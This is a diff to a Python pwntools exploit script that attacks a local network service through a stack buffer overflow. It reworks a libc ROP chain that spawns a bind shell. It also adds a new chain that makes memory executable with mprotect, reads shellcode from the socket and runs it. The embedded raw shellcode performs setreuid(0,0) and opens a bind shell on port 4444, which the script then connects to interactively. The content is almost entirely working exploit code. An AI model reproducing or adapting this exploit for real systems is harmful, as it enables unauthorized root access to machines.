@@ -125,7 +125,7 @@ def bind_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b''):
     payload += p64(libc_base_int + 0x0000000000141ee1)  # xor edx, edx; mov eax, r10d; ret;
     payload += p64(libc_base_int + 0x0000000000123770)  # socket(AF_INET, SOCK_STREAM, 0)
     payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
-    payload += p64(1)
+    payload += p64(0x100)                               # rcx > rdx
     payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret
     payload += p64(bin_base_int + 0x0000000000001600)   # pop r14; pop r15; ret;
     payload += p64(0)
@@ -162,7 +162,7 @@ def bind_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b''):
     payload += p64(libc_base_int + 0x00000000001117e0)  # close(sock)
     payload += p64(libc_base_int + 0x0000000000058dc5)  # mov rax, rdx; ret;
     payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
-    payload += p64(0x100)
+    payload += p64(0x100)                               # rcx > rdx
     payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret
     # dup2 (attach to remote file descriptor)
     payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
@@ -181,22 +181,8 @@ def bind_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b''):
     payload += p64(0)                                   # euid 0 (root)
     payload += p64(libc_base_int + 0x0000000000117920)  # setreuid(0, 0)
     # execve
-    payload += p64(bin_base_int + 0x0000000000001600)   # pop r14; pop r15; ret;
-    payload += p64(0x68732f2f6e69622f)                  # String "/bin//sh"
-    payload += p64(0)
-    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
-    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;  ------------------------------+
-    payload += p64(libc_base_int + 0x00000000000e8199)  # push rsp; push rbx; setne al; ret;           | gets pushed and returned to in next gadget
-    #         <----------------------------------------------------------------------------------------+
-    payload += p64(libc_base_int + 0x000000000011c1e1)  # pop rdx; pop r12; ret;
-    payload += p64(0x28)                                # diff between string address and rsi
-    payload += p64(0)                                   # junk for r12
-    payload += p64(libc_base_int + 0x0000000000137771)  # mov rax, rsi; pop rbx; ret;
-    payload += p64(0)                                   # junk for rbx
-    payload += p64(libc_base_int + 0x000000000004a48c)  # sub rax, rdx; ret;
-    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
-    payload += p64(0x100)                               # rcx > rdx
-    payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret
+    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
+    payload += p64(libc_base_int + 0x00000000001b75aa)  # Address of "/bin/sh" in libc
     payload += p64(libc_base_int + 0x0000000000141ee1)  # xor edx, edx; mov eax, r10d; ret;
     payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
     payload += p64(0)
@@ -207,6 +193,58 @@ def bind_shell(bin_base=b'', libc_base=b'', canary=b'', sfp=b''):
     # Send payload => bind shell to port 4444
     r = remote('localhost', 2323)
     r.send(payload)
+    r.close()
+
+
+def exec_shellcode(bin_base=b'', libc_base=b'', canary=b'', sfp=b'', shellcode=b'', length=4096):
+
+    libc_base_int = u64(libc_base)
+    bin_base_int = u64(bin_base)
+
+    payload = b''
+    payload += b'A' * 264
+    payload += canary
+    payload += sfp
+    # Save the file descriptor (copy to r13)
+    payload += p64(libc_base_int + 0x000000000005e6a1)  # mov rax, rdi; ret;
+    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
+    payload += p64(libc_base_int + 0x0000000000027528)  # pop r14; ret;  -------------------------------+
+    payload += p64(libc_base_int + 0x0000000000047988)  # mov r13, rax; mov rdi, r12; call rbx;         | gets called in next gadget
+    # valloc           <--------------------------------------------------------------------------------+
+    payload += p64(libc_base_int + 0x0000000000026b72)  # pop rdi; ret;
+    payload += p64(length)                              # Allocate length bytes
+    payload += p64(libc_base_int + 0x000000000009e690)  # valloc(length)
+    # mprotect
+    payload += p64(libc_base_int + 0x000000000010556d)  # pop rdx; pop rcx; pop rbx; ret;
+    payload += p64(7)                                   # rcx > rdx
+    payload += p64(8)                                   # rcx > rdx
+    payload += p64(0)                                   # junk for rbx
+    payload += p64(libc_base_int + 0x000000000005e7a2)  # mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret;
+    payload += p64(libc_base_int + 0x0000000000027529)  # pop rsi; ret;
+    payload += p64(length)
+    payload += p64(libc_base_int + 0x000000000011b970)  # mprotect(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC)
+    # read
+    payload += p64(libc_base_int + 0x000000000005e6a1)  # mov rax, rdi; ret;
+    payload += p64(libc_base_int + 0x000000000009f822)  # pop rcx; ret;
+    payload += p64(0)                                   # number of repetitions => want 0
+    payload += p64(libc_base_int + 0x0000000000162052)  # mov rsi, rax; shr ecx, 3; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;
+    payload += p64(libc_base_int + 0x00000000000331ff)  # pop rbx; ret;
+    payload += p64(libc_base_int + 0x00000000001626d5)  # pop rax; pop rdx; pop rbx; ret;  -------------+
+    payload += p64(libc_base_int + 0x00000000000479c6)  # mov rdi, r13; call rbx;                       | gets called in next gadget
+    #                  <--------------------------------------------------------------------------------+
+    payload += p64(length)                              # length into rdx
+    payload += p64(0)                                   # junk for rbx
+    payload += p64(libc_base_int + 0x0000000000110fa0)  # read(sock, addr, length) => read shellcode into memory
+    payload += p64(libc_base_int + 0x0000000000028c1e)  # call rsi;
+
+    log.info(f'Payload length: {len(payload)} bytes')
+
+    # Send payload => read from socket to executable memory
+    r = remote('localhost', 2323)
+    r.send(payload)
+    # Send shellcode to execute
+    sleep(0.1)
+    r.send(shellcode)
     r.close()
 
 
@@ -275,7 +313,23 @@ if __name__ == '__main__':
     log.info(f'libc is loaded at 0x{libc_base[::-1].hex()}')
 
     # Create remote shell
-    bind_shell(bin_base, libc_base, canary, sfp)
+    # bind_shell(bin_base, libc_base, canary, sfp)
+
+    shellcode = b''
+    # Shellcode for setreuid(0 ,0) (own creation)
+    shellcode += b'\x6a\x00\x5f\x6a\x00\x5e\x6a\x71\x58\x0f\x05'
+    # Shellcode for spawning a remote shell (taken from https://www.exploit-db.com/shellcodes/46979)
+    shellcode += b'\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2' \
+                 b'\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x11' \
+                 b'\x5c\x54\x5e\x6a\x31\x58\x54\x5e\x6a\x10\x5a\x0f' \
+                 b'\x05\x6a\x32\x58\x6a\x01\x5e\x0f\x05\x6a\x2b\x58' \
+                 b'\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05' \
+                 b'\x49\x92\x6a\x03\x58\x50\x0f\x05\x49\x87\xfa\x5e' \
+                 b'\x6a\x21\x58\x48\xff\xce\x0f\x05\xe0\xf6\x48\x31' \
+                 b'\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68' \
+                 b'\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
+    exec_shellcode(bin_base, libc_base, canary, sfp, shellcode)
+
     # Connect to remote shell
     r = remote('localhost', 4444)
     r.interactive()
